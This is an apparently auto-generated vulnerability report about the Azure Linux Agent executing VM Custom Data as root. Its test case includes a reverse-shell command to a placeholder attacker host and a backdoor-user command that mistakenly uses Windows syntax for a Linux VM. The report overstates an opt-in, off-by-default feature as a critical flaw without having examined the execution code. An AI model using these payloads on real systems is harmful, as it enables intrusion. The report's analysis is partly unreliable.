- Vulnerability List:
    - Vulnerability 1: Command Injection via Custom Data

- Vulnerability Name: Command Injection via Custom Data

- Description:
    1. The Azure Linux Agent configuration file (`/etc/waagent.conf`) contains options `Provisioning.DecodeCustomData` and `Provisioning.ExecuteCustomData`.
    2. If `Provisioning.ExecuteCustomData` is set to 'y', the agent attempts to execute the Custom Data provided during VM provisioning.
    3. If `Provisioning.DecodeCustomData` is also enabled (set to 'y'), the agent decodes the Custom Data from Base64 before execution.
    4. If an attacker can control or manipulate the Custom Data (e.g., through a compromised Azure account or by intercepting provisioning data if HTTP is allowed), they can inject malicious commands into the Custom Data.
    5. When the agent executes this manipulated Custom Data, it will execute the attacker's commands as root, leading to arbitrary code execution.

- Impact:
    - Full system compromise: Successful exploitation allows an attacker to execute arbitrary code with root privileges on the virtual machine.
    - Data breach: Attackers can gain access to sensitive data stored on the VM.
    - System takeover: Attackers can take complete control of the VM, potentially using it for further malicious activities like botnet participation or lateral movement within Azure infrastructure.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - None: Based on the provided files, there are no explicit sanitization or security checks implemented in the agent code to prevent command injection when executing Custom Data. The configuration options themselves are described in `/code/README.md`, but they are presented as features, not as potential risks with mitigations.

- Missing Mitigations:
    - Input sanitization: The agent should sanitize Custom Data to remove or escape any potentially harmful characters or commands before execution.
    - Sandboxing or secure execution environment: Instead of directly executing Custom Data in a shell, the agent could use a sandboxed environment or a more secure execution method to limit the potential impact of malicious code.
    - Disable by default: `Provisioning.ExecuteCustomData` should be disabled by default to minimize the attack surface. Users who require this functionality should be clearly warned about the security implications and instructed on how to enable it securely.
    - Principle of least privilege: The agent should avoid executing Custom Data as root. If root privileges are absolutely necessary, consider dropping privileges after minimal required operations.

- Preconditions:
    1. `Provisioning.ExecuteCustomData` is enabled in `/etc/waagent.conf` (or the configuration file being used).
    2. Optionally, `Provisioning.DecodeCustomData` is enabled if the attacker wants to provide Base64 encoded commands.
    3. An attacker has the ability to manipulate the Custom Data provided to the VM during provisioning. This could be achieved through compromising Azure accounts, man-in-the-middle attacks (if HTTP is enabled), or other means of intercepting or modifying VM provisioning data.

- Source Code Analysis:
    1. **File: /code/README.md**: This file describes the configuration options, including `Provisioning.ExecuteCustomData` and `Provisioning.DecodeCustomData`. It mentions their functionality but doesn't highlight any security considerations or mitigations.

    ```markdown
    #### __Provisioning.DecodeCustomData__
    _Type: Boolean_
    _Default: n_

    If set, waagent will decode CustomData from Base64.

    #### __Provisioning.ExecuteCustomData__
    _Type: Boolean_
    _Default: n_

    If set, waagent will execute CustomData after provisioning.
    ```

    2. **File: /code/azurelinuxagent/agent.py**:  While this file is the main agent entry point, the actual Custom Data execution logic is likely in the provisioning modules. Further analysis of the provisioning code is needed in subsequent steps (not in the provided PROJECT FILES).

    ```python
    # ... (Snippet from README.md indicates that waagent.conf controls actions)
    A configuration file (/etc/waagent.conf) controls the actions of waagent.
    ...
    ```

    3. **Configuration samples in /code/README.md**: The sample configuration shows that `Provisioning.ExecuteCustomData` is set to 'n' by default, which is a good security practice, but users can enable it.

    ```yml
    Provisioning.DecodeCustomData=n
    Provisioning.ExecuteCustomData=n
    ```

    **Visualization:**

    ```mermaid
    graph LR
        A[Attacker Manipulates Custom Data] --> B{Provisioning.ExecuteCustomData=y?};
        B -- Yes --> C{Provisioning.DecodeCustomData=y?};
        B -- No --> F[Agent Ignores Custom Data];
        C -- Yes --> D[Agent Decodes Custom Data (Base64)];
        C -- No --> E[Agent Uses Custom Data As Is];
        D --> G[Agent Executes Custom Data as Root];
        E --> G;
        G --> H[Arbitrary Code Execution as Root];
    ```

- Security Test Case:
    1. **Pre-requisites:**
        - Deploy an Azure Linux VM instance.
        - Ensure that `Provisioning.ExecuteCustomData=y` is set in `/etc/waagent.conf` on the VM. You can achieve this by creating a custom image with this setting or using a Custom Script Extension to modify the configuration file during VM creation.
        - Ensure that `Provisioning.DecodeCustomData=y` is set in `/etc/waagent.conf` on the VM (optional, but recommended for a more realistic test).
    2. **Attack Simulation:**
        - As an attacker, craft a Custom Data payload that contains a malicious command. For example, to create a backdoor user:

        ```bash
        echo 'net user attacker P@$$wOrd123! /add && net localgroup administrators attacker /add' | base64
        ```
        - For Linux, a simple reverse shell can be used:
        ```bash
        echo 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' | base64
        ```
        Replace `ATTACKER_IP` and `ATTACKER_PORT` with the attacker's listening IP and port.

        - When creating the VM (either through Azure Portal, CLI, or ARM template), provide this crafted Base64 encoded string (or plain text command if `Provisioning.DecodeCustomData=n`) as the Custom Data for the VM.
    3. **Verification:**
        - After the VM is provisioned and the agent has processed the Custom Data, attempt to connect to the VM using the backdoor account (if using the `net user` example) or check for a reverse shell connection on the attacker's listening port (if using the reverse shell example).
        - Check `/var/log/waagent.log` to confirm that Custom Data execution was attempted and if any errors occurred.
        - If the test is successful, the attacker will have achieved arbitrary code execution on the VM.
